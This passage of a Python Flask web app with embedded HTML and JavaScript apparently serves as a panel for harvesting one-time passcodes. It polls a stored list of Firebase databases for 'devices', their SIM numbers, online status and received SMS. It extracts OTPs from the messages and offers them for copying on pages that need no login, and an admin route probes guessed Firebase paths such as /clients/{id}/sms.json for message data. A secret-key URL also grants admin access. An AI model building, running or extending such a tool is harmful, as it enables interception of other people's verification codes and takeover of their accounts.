const sig = msgs.map(m => (m.timestamp||0) + '|' + (m.message||'').slice(0,40)).join('#');
if(sig !== lastInboxSig){ lastInboxSig = sig; renderMessages(msgs); }
}catch(e){ clearTimeout(tid); } }

function renderMessages(msgs){
const box = document.getElementById('sms-container');
const now = Math.floor(Date.now() / 1000);
let list = [...msgs].sort((a, b) => (b.timestamp||0) - (a.timestamp||0)).slice(0, 60);
updateTopBadge(list);
if(!list.length){ box.innerHTML = '<div class="empty">📭 No SMS</div>'; return; }
box.innerHTML = '<div class="sms-list">' + list.map(m => {
const otp = m.otp || extractOtp(m.message);
const body = otp ? escapeHtml(m.message).replace(otp, '<span class="otp-highlight">'+otp+'</span>') : escapeHtml(m.message);
const copyBtn = otp ? '<button class="otp-copy-btn" onclick="copyOtp(\\'' + otp + '\\')">📋 Copy OTP ' + otp + '</button>' : '';
const ts = m.timestamp || 0; const isFresh = ts >= (now - 120);
const timeStr = m.date_string ? m.date_string : fmtTime(ts);
const newBadge = isFresh ? '<span class="new-badge">NEW</span>' : '';
return '<div class="sms-item ' + (isFresh?'fresh':'') + '">' +
'<div class="sms-head"><div class="sender">' + escapeHtml(m.from || 'Unknown') + ' ' + newBadge + '</div>' +
'<div class="sms-time">' + escapeHtml(timeStr) + '</div></div>' +
'<div class="sms-body">' + body + '</div>' + copyBtn + '</div>';
}).join('') + '</div>'; }

function backToList(){
document.getElementById('inbox-view').classList.add('hidden');
document.getElementById('list-view').classList.remove('hidden');
if(refreshTimer){ clearInterval(refreshTimer); refreshTimer = null; }
currentNum = null; }

function extractOtp(text){ if(!text) return '';
const t = String(text);
let m = t.match(/(?:otp|one[- ]time|password|code|pin|verification|passcode)[^\\d]{0,30}(\\d{4,8})/i);
if(m) return m[1];
m = t.match(/(\\d{4,8})[^\\d]{0,30}(?:is your|otp|one[- ]time|code)/i);
if(m) return m[1]; m = t.match(/#(\\d{4,8})/); if(m) return m[1]; return ''; }

function fmtTime(ts){ if(!ts) return '';
try{ let t = parseInt(ts); if(t > 1e12) t = Math.floor(t/1000); if(t < 1e9) return String(ts);
const d = new Date(t * 1000);
const opts = { timeZone: 'Asia/Kolkata', hour12: true, day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit' };
return d.toLocaleString('en-IN', opts).replace(',', ' |'); }catch(e){ return String(ts); } }

function copyOtp(code){ const done = ()=>toast('✅ Copied: ' + code);
if(navigator.clipboard){ navigator.clipboard.writeText(code).then(done).catch(()=>{
const ta = document.createElement('textarea'); ta.value = code; document.body.appendChild(ta);
ta.select(); document.execCommand('copy'); ta.remove(); done(); }); } }

function escapeHtml(s){ return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }

loadFirebase();
setInterval(loadFirebase, 30000);
</script>
</body></html>"""


# ============================================================
# DEBUG HTML
# ============================================================
DEBUG_HTML = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>Raw Data</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif}
body{background:#0f172a;color:#e2e8f0;padding:16px}
.wrap{max-width:920px;margin:0 auto}
h1{font-size:15px;color:#a5b4fc;margin-bottom:8px}
.sub{font-size:11px;color:#64748b;margin-bottom:14px;word-break:break-all;font-family:monospace}
.back{display:inline-block;padding:9px 14px;background:#334155;color:#e2e8f0;
text-decoration:none;border-radius:8px;font-size:12px;margin-bottom:12px}
.card{background:#1e293b;border:1px solid #334155;border-radius:10px;padding:12px;
margin-bottom:10px;font-size:12px}
.path{color:#fbbf24;font-weight:700;margin-bottom:6px;font-family:monospace;word-break:break-all}
.ok{color:#4ade80;font-weight:600}
.empty{color:#f87171;font-weight:600}
.data{background:#0f172a;border-radius:8px;padding:10px;color:#cbd5e1;
font-family:monospace;font-size:10px;white-space:pre-wrap;word-break:break-word;
max-height:400px;overflow-y:auto;margin-top:6px}
.summary{background:#1e1b4b;border:1px solid #4338ca;border-radius:10px;
padding:14px;margin-bottom:14px;font-size:13px}
</style></head><body>
<div class="wrap">
<a href="/firebases" class="back">← Back</a>
<h1>🔍 RAW DATA EXPLORER</h1>
<div class="sub" id="sub">Loading...</div>
<div class="summary" id="summary" style="display:none">Scanning...</div>
<div id="results"></div>
</div>
<script>
const p = new URLSearchParams(location.search);
const FB = p.get('fb'), DEV = p.get('id');
document.getElementById('sub').textContent = 'Device: ' + DEV;
(async () => {
try{
const r = await fetch('/api/rawdata?fb=' + encodeURIComponent(FB) + '&id=' + encodeURIComponent(DEV));
const d = await r.json();
if(!d.success){ document.getElementById('results').innerHTML = '<div class="card empty">❌ ' + (d.error||'Error') + '</div>'; return; }
document.getElementById('summary').style.display = 'block';
document.getElementById('summary').innerHTML = '🔎 <b>' + d.scanned + ' paths</b> scanned — <b>' + d.found + '</b> with data';
document.getElementById('results').innerHTML = d.results.map(item => {
const cls = item.status === 'has_data' ? 'ok' : 'empty';
const st = item.status === 'has_data' ? '✅ HAS DATA' + (item.message_count ? ' — ' + item.message_count + ' msgs' : '') : '⚪ Empty';
const dt = item.data ? JSON.stringify(item.data, null, 2).slice(0, 3000) : '';
return '<div class="card"><div class="path">' + item.path + '</div><div class="' + cls + '">' + st + '</div>' + (dt ? '<div class="data">' + escapeHtml(dt) + '</div>' : '') + '</div>';
}).join('');
}catch(e){ document.getElementById('results').innerHTML = '<div class="card empty">❌ Network error</div>'; }
})();
function escapeHtml(s){ return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }
</script>
</body></html>"""


# ============================================================
# ROUTES
# ============================================================
@app.route("/")
def root_redirect():
    return redirect(url_for("landing_page"))


@app.route("/landingpage")
def landing_page():
    return Response(LANDING_HTML, mimetype="text/html")


@app.route("/admin", methods=["GET", "POST"])
def admin_login_page():
    if session.get("logged_in") and session.get("role") == "admin":
        return redirect(url_for("admin_dashboard"))
    error = ""
    if request.method == "POST":
        pwd = request.form.get("password", "")
        if pwd == get_pwd("admin"):
            session["logged_in"] = True
            session["role"] = "admin"
            session["is_admin"] = True
            return redirect(url_for("admin_dashboard"))
        error = '<div class="err">❌ Wrong admin password!</div>'
    return Response(ADMIN_LOGIN_HTML.replace("__ERROR__", error), mimetype="text/html")


@app.route("/SUPER_MASTER/<key>")
def super_master_key_entry(key):
    if key != ADMIN_URL_KEY:
        abort(404)
    session["logged_in"] = True
    session["role"] = "admin"
    session["is_admin"] = True
    return redirect(url_for("admin_dashboard"))


@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("landing_page"))


# ✅ USER PANEL — NO LOGIN
@app.route("/user")
def user_dashboard():
    return Response(USER_DASHBOARD_HTML, mimetype="text/html")


# ✅ PERSONAL OTP — NO LOGIN
@app.route("/otp")
def personal_otp():
    return Response(PERSONAL_OTP_HTML, mimetype="text/html")


# ✅ ADMIN ROUTES — login required
@app.route("/admin/dashboard")
@admin_required
def admin_dashboard():
    return Response(ADMIN_DASHBOARD_HTML, mimetype="text/html")


@app.route("/admin/security")
@admin_required
def admin_security():
    return Response(SECURITY_HTML, mimetype="text/html")


@app.route("/firebases")
@admin_required
def firebases_page():
    return Response(FIREBASES_HTML, mimetype="text/html")


@app.route("/firebase/<fb_id>")
@admin_required
def firebase_view_page(fb_id):
    return Response(FIREBASE_VIEW_HTML.replace("{{FB_ID}}", fb_id), mimetype="text/html")


@app.route("/debug")
@admin_required
def debug_page():
    return Response(DEBUG_HTML, mimetype="text/html")


# ============================================================
# API — PUBLIC (no login for user endpoints)
# ============================================================
@app.route("/api/conn")
def api_conn():
    init_mongo()
    return jsonify({"success": True, "mongo_connected": MONGO_OK})


@app.route("/api/refresh", methods=["POST"])
def api_refresh():
    threading.Thread(target=refresh_cache, daemon=True).start()
    return jsonify({"success": True})


@app.route("/api/numbers")
def api_numbers():
    init_mongo()
    with cache["lock"]:
        nums = list(cache["numbers_map"].values())
        stats = dict(cache["stats"])
        loading = cache["loading"]
        progress = dict(cache["progress"])
    if not nums and not loading and not IS_SERVERLESS:
        threading.Thread(target=refresh_cache, daemon=True).start()
    fb_total = 0
    if MONGO_OK:
        try:
            fb_total = fb_collection.count_documents({})
        except Exception:
            fb_total = 0
    return jsonify({
        "success": True, "numbers": nums,
        "total": stats.get("total", 0),
        "online": stats.get("online", 0),
        "offline": stats.get("offline", 0),
        "otp_rate": stats.get("otp_rate", 0),
        "loading": loading,
        "progress": progress,
        "firebases_total": fb_total,
    })


@app.route("/api/inbox")
def api_inbox():
    try:
        fb_url = request.args.get("fb", "").strip()
        dev_id = request.args.get("id", "").strip()
        num = request.args.get("num", "").strip()
        if not fb_url or not dev_id or not num:
            return jsonify({"success": False, "error": "missing params"}), 400
        key = f"{fb_url}|{dev_id}|{num}"
        now = time.time()
        with cache["lock"]:
            cached = cache["device_messages"].get(key)
            cached_at = cache["msg_cache_time"].get(key, 0)
            inbox_lock = cache["inbox_locks"].setdefault(key, threading.Lock())
        if cached and (now - cached_at) < MESSAGE_CACHE_TTL:
            return jsonify({"success": True, "messages": cached[:MAX_SMS_PER_NUMBER],
                            "count": len(cached), "cached": True, "target_number": num})
        with inbox_lock:
            with cache["lock"]:
                cached = cache["device_messages"].get(key)
                cached_at = cache["msg_cache_time"].get(key, 0)
            if cached and (time.time() - cached_at) < MESSAGE_CACHE_TTL:
                return jsonify({"success": True, "messages": cached[:MAX_SMS_PER_NUMBER],
                                "count": len(cached), "cached": True, "target_number": num})
            msgs = fetch_messages_multi_path(fb_url, dev_id, phone_numbers=[num])
            received = [m for m in msgs if m.get("type") == "received"]
            matched = received if received else msgs
            matched = sorted(matched, key=lambda x: x.get("timestamp", 0) or 0, reverse=True)
            for m in matched:
                m["otp"] = extract_otp(m.get("message", ""))
            matched = matched[:MAX_SMS_PER_NUMBER]
            with cache["lock"]:
                cache["device_messages"][key] = matched
                cache["msg_cache_time"][key] = time.time()
        return jsonify({"success": True, "messages": matched,
                        "count": len(matched), "cached": False, "target_number": num})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@app.route("/api/otp/add", methods=["POST"])
def api_otp_add():
    init_mongo()
    if not MONGO_OK:
        return jsonify({"success": False, "error": "MongoDB down"}), 500
    try:
        data = request.get_json() or {}
        url = (data.get("url") or "").strip().rstrip("/")
        if url and not url.startswith("http"):
            url = "https://" + url
        if not url or "firebase" not in url:
            return jsonify({"success": False, "error": "Invalid URL"}), 400
        if fb_collection.find_one({"url": url}):
            return jsonify({"success": True, "hash": fb_hash(url)})
        name = url.replace("https://", "").split(".")[0][:30]
        fb_collection.insert_one({
            "url": url, "name": name,
            "added_at": int(time.time()),
            "source": "personal_otp",
        })
        if not IS_SERVERLESS:
            threading.Thread(target=refresh_cache, daemon=True).start()
        return jsonify({"success": True, "hash": fb_hash(url)})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@app.route("/api/otp/data", methods=["POST"])
def api_otp_data():
    try:
        data = request.get_json() or {}
        urls = data.get("urls", [])
        if not isinstance(urls, list) or not urls:
            return jsonify({"success": False, "error": "No URLs"}), 400
        all_numbers = []
        total_otp = 0
        total_msg = 0
        for url in urls[:20]:
            try:
                devices = fetch_devices_from_one_fb(url, "user_fb", "")
                for dev in devices:
                    is_on = dev.get("online", False)
                    for sim in dev.get("sims", []):
                        num = sim["number"]
                        msgs = dev.get("per_number", {}).get(num, [])
                        otp_c = sum(1 for m in msgs if extract_otp(m.get("message", "")))
                        total_otp += otp_c
                        total_msg += len(msgs)
                        all_numbers.append({
                            "number": num, "device_id": dev["id"],
                            "device_name": dev.get("name", ""),
                            "firebase": url, "online": is_on,
                            "msg_count": len(msgs), "otp_count": otp_c,
                            "confidence": sim.get("confidence", 0),
                        })
            except Exception as e:
                print(f"otp data err: {e}")
        seen = set()
        uniq = []
        for n in all_numbers:
            if n["number"] in seen: continue
            seen.add(n["number"])
            uniq.append(n)
        rate = int((total_otp / total_msg) * 100) if total_msg > 0 else 0
        return jsonify({
            "success": True, "numbers": uniq,
            "total": len(uniq),
            "online": sum(1 for n in uniq if n.get("online")),
            "offline": sum(1 for n in uniq if not n.get("online")),
            "otp_rate": rate,
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


# ✅ ADMIN APIs
@app.route("/api/rawdata")
@admin_required
def api_rawdata():
    fb_url = request.args.get("fb", "").strip()
    dev_id = request.args.get("id", "").strip()
    if not fb_url or not dev_id:
        return jsonify({"success": False, "error": "missing"}), 400
    base = fb_url.rstrip("/")
    paths = [
        f'/messages/{dev_id}.json?orderBy="$key"&limitToLast=60',
        f"/messages/{dev_id}.json", f"/clients/{dev_id}.json",
        f"/clients/{dev_id}/messages.json", f"/clients/{dev_id}/sms.json",
        f"/clients/{dev_id}/inbox.json", f"/clients/{dev_id}/receivedSms.json",
        f"/clients/{dev_id}/received.json", f"/clients/{dev_id}/incoming.json",
        f"/clients/{dev_id}/history.json", f"/clients/{dev_id}/logs.json",
        f"/inbox/{dev_id}.json", f"/received/{dev_id}.json",
        f"/sms/{dev_id}.json", f"/devices/{dev_id}.json",
        f"/users/{dev_id}.json", "/clients.json?shallow=true",
    ]
    results, found = [], 0
    for p in paths:
        data = try_json(base + p, timeout=6)
        item = {"path": p, "data": None, "message_count": 0, "status": "not_found"}
        if data is None:
            item["status"] = "empty"
        else:
            item["data"] = data
            item["message_count"] = len(collect_all_messages(data))
            item["status"] = "has_data"
            found += 1
        results.append(item)
    return jsonify({"success": True, "scanned": len(paths), "found": found, "results": results})


@app.route("/api/security/change", methods=["POST"])
@admin_required
def api_security_change():
    init_mongo()
    data = request.get_json() or {}
    role = data.get("role", "").strip()
    pwd = data.get("password", "").strip()
    if role != "admin":
        return jsonify({"success": False, "error": "Only admin role supported"}), 400
    if not pwd or len(pwd) < 4:
        return jsonify({"success": False, "error": "Password too short"}), 400
    ok = set_pwd(role, pwd)
    if ok:
        return jsonify({"success": True})
    return jsonify({"success": False, "error": "MongoDB down or failed"}), 500


@app.route("/api/firebases", methods=["GET"])
@admin_required
def api_fb_list():
    init_mongo()
    if not MONGO_OK:
        return jsonify({"success": False, "error": "MongoDB down"}), 500
    try:
        docs = list(fb_collection.find({}).sort("added_at", -1))
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500
    with cache["lock"]:
        fb_stats = dict(cache["fb_stats"]) if cache["fb_stats"] else {}
    if not fb_stats:
        if IS_SERVERLESS:
            try:
                fetch_fb_stats()
                with cache["lock"]:
                    fb_stats = dict(cache["fb_stats"])
            except Exception:
                pass
        else:
            threading.Thread(target=fetch_fb_stats, daemon=True).start()
    out = []
    for d in docs:
        url = d.get("url", "")
        fid = str(d["_id"])
        stats = fb_stats.get(fid, {"online": 0, "offline": 0, "devices": 0})
        out.append({
            "id": fid,
            "name": d.get("name", ""),
            "hash": fb_hash(url),
            "added_at": d.get("added_at", 0),
            "source": d.get("source", "admin"),
            "stats": stats,
        })
    return jsonify({"success": True, "firebases": out, "count": len(out)})


@app.route("/api/firebase/<fb_id>", methods=["GET"])
@admin_required
def api_fb_view(fb_id):
    init_mongo()
    if not MONGO_OK:
        return jsonify({"success": False, "error": "MongoDB down"}), 500
    try:
        doc = fb_collection.find_one({"_id": ObjectId(fb_id)})
    except Exception:
        return jsonify({"success": False, "error": "Invalid id"}), 400
    if not doc:
        return jsonify({"success": False, "error": "Not found"}), 404
    fb_url = doc.get("url", "")
    devices = fetch_devices_from_one_fb(fb_url, doc.get("name", ""), fb_id)
    numbers = []
    otp_total = 0
    online_count = 0
    offline_count = 0
    for dev in devices:
        is_dev_online = dev.get("online", False)
        if is_dev_online: online_count += 1
        else: offline_count += 1
        for sim in dev.get("sims", []):
            num = sim["number"]
            msgs = dev.get("per_number", {}).get(num, [])
            otp_count = sum(1 for m in msgs if extract_otp(m.get("message", "")))
            otp_total += otp_count
            numbers.append({
                "number": num,
                "device_id": dev["id"],
                "device_name": dev.get("name", ""),
                "firebase": fb_url,
                "online": is_dev_online,
                "msg_count": len(msgs),
                "otp_count": otp_count,
            })
    return jsonify({
        "success": True, "id": fb_id,
        "name": doc.get("name", ""),
        "hash": fb_hash(fb_url),
        "device_count": len(devices),
        "online_count": online_count,
        "offline_count": offline_count,
        "number_count": len(numbers),
        "otp_count": otp_total,
        "numbers": numbers,
    })


@app.route("/api/firebases", methods=["POST"])
@admin_required
def api_fb_add():
    init_mongo()
    if not MONGO_OK:
        return jsonify({"success": False, "error": "MongoDB down"}), 500
    data = request.get_json() or {}
    url = (data.get("url") or "").strip().rstrip("/")
    if url and not url.startswith("http"):
        url = "https://" + url
    if not url or "firebase" not in url:
        return jsonify({"success": False, "error": "Invalid URL"}), 400
    if fb_collection.find_one({"url": url}):
        return jsonify({"success": False, "error": "Already added"}), 409
    name = url.replace("https://", "").split(".")[0][:30]
    fb_collection.insert_one({
        "url": url, "name": name,
        "added_at": int(time.time()),
        "source": "admin",
    })
    if not IS_SERVERLESS:
        threading.Thread(target=refresh_cache, daemon=True).start()
    return jsonify({"success": True})


@app.route("/api/firebases/bulk", methods=["POST"])
@admin_required
def api_fb_bulk():
    init_mongo()
    if not MONGO_OK:
        return jsonify({"success": False, "error": "MongoDB down"}), 500
    data = request.get_json() or {}
    urls = data.get("urls", [])
    added, skipped = 0, 0
    for u in urls:
        url = (u or "").strip().rstrip("/")
        if url and not url.startswith("http"):
            url = "https://" + url
        if not url or "firebase" not in url:
            continue
        if fb_collection.find_one({"url": url}):
            skipped += 1
            continue
        name = url.replace("https://", "").split(".")[0][:30]
        fb_collection.insert_one({
            "url": url, "name": name,
            "added_at": int(time.time()),
            "source": "admin_bulk",
        })
        added += 1
    if not IS_SERVERLESS:
        threading.Thread(target=refresh_cache, daemon=True).start()
    return jsonify({"success": True, "added": added, "skipped": skipped})


@app.route("/api/firebases/<fb_id>", methods=["DELETE"])
@admin_required
def api_fb_delete(fb_id):
    init_mongo()
    if not MONGO_OK:
        return jsonify({"success": False, "error": "MongoDB down"}), 500
    try:
        res = fb_collection.delete_one({"_id": ObjectId(fb_id)})
        if res.deleted_count == 0:
            return jsonify({"success": False, "error": "Not found"}), 404
        with cache["lock"]:
            cache["numbers_map"] = {}
            cache["devices"] = {}
            cache["device_messages"] = {}
            cache["msg_cache_time"] = {}
            cache["stats"] = {"total": 0, "online": 0, "offline": 0, "otp_rate": 0}
            cache["fb_stats"] = {}
        if not IS_SERVERLESS:
            threading.Thread(target=refresh_cache, daemon=True).start()
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 400


@app.route("/api/firebases/bulk-delete", methods=["POST"])
@admin_required
def api_fb_bulk_delete():
    init_mongo()
    if not MONGO_OK:
        return jsonify({"success": False, "error": "MongoDB down"}), 500
    data = request.get_json() or {}
    ids = data.get("ids", [])
    deleted = 0
    for i in ids:
        try:
            res = fb_collection.delete_one({"_id": ObjectId(i)})
            deleted += res.deleted_count
        except Exception:
            pass
    with cache["lock"]:
        cache["numbers_map"] = {}
        cache["devices"] = {}
        cache["device_messages"] = {}
        cache["msg_cache_time"] = {}
        cache["stats"] = {"total": 0, "online": 0, "offline": 0, "otp_rate": 0}
        cache["fb_stats"] = {}
    if not IS_SERVERLESS:
        threading.Thread(target=refresh_cache, daemon=True).start()
    return jsonify({"success": True, "deleted": deleted})


@app.route("/api/firebases/all", methods=["DELETE"])
@admin_required
def api_fb_delete_all():
    init_mongo()
    if not MONGO_OK:
        return jsonify({"success": False, "error": "MongoDB down"}), 500
    try:
        res = fb_collection.delete_many({})
        with cache["lock"]:
            cache["numbers_map"] = {}
            cache["devices"] = {}
            cache["device_messages"] = {}
            cache["msg_cache_time"] = {}
            cache["stats"] = {"total": 0, "online": 0, "offline": 0, "otp_rate": 0}
            cache["fb_stats"] = {}
        if not IS_SERVERLESS:
            threading.Thread(target=refresh_cache, daemon=True).start()
        return jsonify({"success": True, "deleted": res.deleted_count})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


# ============================================================
# START BG
# ============================================================
if not IS_SERVERLESS:
    threading.Thread(target=bg_refresher, daemon=True).start()
    print(f"BG refresher started — interval: {BG_REFRESH_INTERVAL}s (10 min)")
else:
    print("Serverless mode: BG disabled")


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
